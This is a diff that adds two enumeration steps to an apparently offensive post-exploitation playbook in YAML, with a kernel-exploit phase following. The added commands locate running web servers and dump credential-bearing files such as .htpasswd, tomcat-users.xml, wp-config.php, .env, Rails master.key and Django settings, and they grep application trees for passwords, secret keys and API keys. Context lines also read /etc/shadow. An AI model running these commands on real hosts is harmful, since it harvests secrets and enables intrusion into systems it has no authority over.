@@ -60,6 +60,72 @@ steps:
       - "ls -la /home/*/.ssh/"
       - "cat /etc/shadow 2>/dev/null"
 
+  - id: webserver-enum
+    name: "Web Server & Reverse Proxy Enumeration"
+    phase: enumeration
+    description: "Identify running web servers and extract credentials from their configs"
+    commands:
+      - "ps aux | grep -E 'apache|nginx|tomcat|gunicorn|uwsgi|node|python|ruby|java|php'"
+      - "ss -tlnp"
+      - "systemctl list-units --type=service | grep -E 'web|app|http|tomcat|nginx|apache'"
+      - "find /etc/systemd/system/ -name '*.service' | xargs grep -l 'ExecStart' 2>/dev/null"
+      # Apache
+      - "cat /etc/apache2/apache2.conf 2>/dev/null; cat /etc/httpd/conf/httpd.conf 2>/dev/null"
+      - "ls -la /etc/apache2/sites-enabled/ 2>/dev/null"
+      - "find / -name '.htpasswd' 2>/dev/null"
+      # Nginx
+      - "cat /etc/nginx/nginx.conf 2>/dev/null"
+      - "ls -la /etc/nginx/conf.d/ 2>/dev/null"
+      # Tomcat
+      - "cat /etc/tomcat*/tomcat-users.xml 2>/dev/null; find /opt -name 'tomcat-users.xml' 2>/dev/null | xargs cat"
+      - "find / -name 'web.xml' 2>/dev/null | head -5 | xargs cat"
+      # JBoss/WildFly
+      - "find /opt/jboss /opt/wildfly -name 'standalone.xml' 2>/dev/null | xargs cat"
+      - "find / -name 'mgmt-users.properties' 2>/dev/null | xargs cat"
+      # GlassFish
+      - "find /opt/glassfish* -name 'domain.xml' 2>/dev/null | xargs cat"
+      # HAProxy
+      - "cat /etc/haproxy/haproxy.cfg 2>/dev/null"
+      # Traefik
+      - "cat /etc/traefik/traefik.yml 2>/dev/null"
+      # Gunicorn / uWSGI
+      - "find /etc/uwsgi /etc/gunicorn -name '*.ini' -o -name '*.conf' 2>/dev/null | xargs cat"
+
+  - id: app-language-enum
+    name: "Application Language & Framework Enumeration"
+    phase: enumeration
+    description: "Find framework config files and extract credentials based on the app stack"
+    commands:
+      # Universal
+      - "find / -name '.env' -not -path '*/proc/*' 2>/dev/null"
+      - "grep -ri 'DB_PASS\\|DATABASE_PASSWORD\\|SECRET_KEY\\|API_KEY\\|jdbc:' /var/www /opt /srv /home 2>/dev/null | grep -v '.pyc' | head -30"
+      - "find /var/www /opt /srv /home -name '*.log' 2>/dev/null | head -20"
+      # PHP — WordPress / Laravel / Symfony / Drupal / Joomla / CodeIgniter / Magento
+      - "find / -name 'wp-config.php' 2>/dev/null | xargs cat"
+      - "find / -name '.env' | xargs grep -l 'DB_\\|APP_KEY' 2>/dev/null | xargs cat"
+      - "find / -name 'settings.php' 2>/dev/null | xargs cat"
+      - "find / -name 'configuration.php' 2>/dev/null | xargs cat"
+      - "find / -name 'database.php' -path '*/config/*' 2>/dev/null | xargs cat"
+      - "find / -name 'env.php' -o -name 'local.xml' 2>/dev/null | xargs cat"
+      # Python — Django / Flask / FastAPI
+      - "find / -name 'settings.py' 2>/dev/null | xargs grep -l 'DATABASE\\|SECRET' | xargs cat"
+      - "find / -name 'local_settings.py' -o -name 'instance/config.py' 2>/dev/null | xargs cat"
+      # Java — Spring Boot / Struts / Hibernate / Micronaut
+      - "find / -name 'application.properties' -o -name 'application.yml' -o -name 'bootstrap.yml' 2>/dev/null | xargs cat"
+      - "find / -name 'hibernate.cfg.xml' -o -name 'persistence.xml' 2>/dev/null | xargs cat"
+      - "find / -name 'struts.xml' 2>/dev/null | xargs cat"
+      # Node.js — Express / NestJS / Next.js / KeystoneJS
+      - "find / -name '.env.local' -o -name '.env.production' 2>/dev/null | xargs cat"
+      - "find / -name 'ormconfig.json' -o -name 'config/default.json' 2>/dev/null | xargs cat"
+      - "find / -name 'package.json' -not -path '*/node_modules/*' 2>/dev/null | xargs grep -l 'dependencies' | head -5"
+      # Ruby — Rails / Sinatra
+      - "find / -name 'database.yml' -o -name 'secrets.yml' 2>/dev/null | xargs cat"
+      - "find / -name 'master.key' 2>/dev/null"
+      - "find / -name 'credentials.yml.enc' 2>/dev/null"
+      # Go / .NET Core
+      - "find / -name 'appsettings.json' -o -name 'appsettings.Production.json' 2>/dev/null | xargs cat"
+      - "find / -name 'config.toml' -o -name 'config.yaml' -not -path '*/proc/*' 2>/dev/null | xargs cat"
+
   - id: kernel-exploit
     name: "Kernel / OS Exploits"
     phase: exploitation
